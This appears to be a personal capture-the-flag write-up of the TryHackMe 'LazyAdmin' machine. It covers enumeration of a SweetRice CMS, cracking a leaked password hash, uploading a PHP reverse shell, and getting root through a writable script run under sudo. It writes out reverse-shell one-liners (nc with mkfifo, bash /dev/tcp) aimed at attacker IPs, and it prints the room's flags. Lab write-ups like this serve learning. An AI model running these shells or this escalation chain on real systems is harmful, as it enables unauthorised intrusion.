# LazyAdmin

Along these notes, there would be multiple address although they are the same machines (i was just noto giving attention to the expiring counter).

# Solution

Starting with nmap scans as usual. I'm changing my approach to start with a simpler scan and grow from there

```bash
cmd: sudo nmap 10.10.75.207

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

cmd: sudo nmap -sC -sV -oN nmap/s2 -p 22,80 10.10.75.207
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Nmap states that the webserver only displays the apache default page so i'll let an all ports scan in the background while i do a gobuster <br>

```
cmd: gobuster dir -u http://10.10.75.207 -o fuzz/dir-medium.log -x php,txt,html -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 40

/content              (Status: 301) [Size: 314] [--> http://10.10.75.207/content/]
/index.html           (Status: 200) [Size: 11321] 
```

Checking **/content** we can see the following message
```

Welcome to SweetRice - Thank your for install SweetRice as your website management system.
This site is building now , please come late.

If you are the webmaster,please go to Dashboard -> General -> Website setting

and uncheck the checkbox "Site close" to open your website.

More help at Tip for Basic CMS SweetRice installed (link to doc)
```

I tried **/dashboard** immediately but without success. Checking the page source i came to the **SeetRice** JavaScript script that discloses the version
```js
/**
 * SweetRice javascript function.
 *
 * @package SweetRice
 * @Dashboard core
 * @since 0.5.4
 */
```

Checking online for this version, there are some vulnerabilities but they either do not work or need credentials. <br>

Since i had not much, i did a second level gobuster in th **/content** endpoint and found quite a few results. (Note: this time i used ffuf since i kinda like it more for fuzzing)

```bash
cmd:ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.75.207/co
ntent/FUZZ

.htaccess               [Status: 403, 
.htpasswd               [Status: 403, 
_themes                 [Status: 301, 
as                      [Status: 301, 
attachment              [Status: 301, 
images                  [Status: 301, 
inc                     [Status: 301, 
js                      [Status: 301, 
```

I went and checked each by hand, just trying to find something interesting:
- as: login page
- attachment: empty
- inc: list of inclusions (majority is .php files, which we cannot downlaod)

Checking the **/content/inc** endpoint, we can see some interesting stuff (present in the **./files** directory):
- **latest.txt** - 1.5.1 (the real version, that's why some exploits did not work)
- **mysql_backup/mysql_bakup_20191129023059-1.5.1.sql** - well well well, something interesting :D
- **cache/cache.db** - might be interesting too


First lets check the mysql file.  <br>

Well, it is just a database creation file. <br>

Searching for insert, we can see a little cool line there
```sql
INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\

-- passwd -> 42f749ade7f9e195bf475f37a44cafcb -> Password123 (john)
```

Well, we have a password now, lets try the login page with admin:Password123. No luck :(  <br>

Well, analyzing the sql statement further, we can see references to **Lazy Admin** and **manager**, lets try them !  Manager:Password123 works !! <br>

Now that we have credentials, we can abuse the previously seen exploits that required them ! I'll use one that allows file uploads by sending a post request to **/as/?type=media_center&mode=upload**. <br>

The exploit seems to execute correctly but the file is not created @ /attachments/... lets poke around in the dashboard <br>
   
Information found
```sql
-- Page: /content/as/?type=setting
Database : mysql
Database Host : localhost
Database Port : 3306
Database Account : rice
Database Password : randompass
Database Name: website
Database Prefix: v

-- Page: /content/as/?type=media_center
-- Allows folder creation and file uploads
```

Now we just need to upload some php backdoor/revshel:
1. Create the file
2. Zip it
3. select the file with the dialog
4. check "Extract zip archive?" option
5. Upload
6. Access /content/attachment/filename (name is a random hash)

```bash
# cmd: whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

First thing to check? MYSQL... nothing there tho <br>

In the www-data home directory (/var/www) there's also nothing interesting... checking home folders it is visible we can read the **itguy** home folder (as well as the user.txt file) <br>

## Flag: THM{63e5bce9271952aad1113b6f1ac28a07}

There are some interesting files at this home folder:
- backup.pl (owned by root)
- mysql_login.txt (with the same creds we got)

It is highly probable that this backup is ran with an automated job/task...
```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

Since we dont have write permissions in this user home folder, we need to pivot to him so we can abuse the relative path used by the script ! <br>

Well, we dont actualy need that because we can modify the file it executes in that script (**/etc/copy.sh**)
```bash
cmd: ls -la /etc/copy.sh 
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh

cat: /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

It already had a *BSD style reverse shell... lets change it to a simple bash reverse shell <br>

```bash
cmd: echo -n '/bin/bash -c "bash -i >& /dev/tcp/10.9.128.84/1415 0>&1"' > /etc/copy.sh
```

Since it was not executing automatically i did "sudo -l" just in case, and well, this is stupid:
```bash
cmd: sudo -l

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

cmd: sudo /usr/bin/perl /home/itguy/backup.pl
cmd: /dev/shm/waza -p
cmd: whoami && id

root
uid=0(root) gid=0(root) groups=0(root)
```

# Flag: THM{6637f41d0177b6f37cb20d775124699f}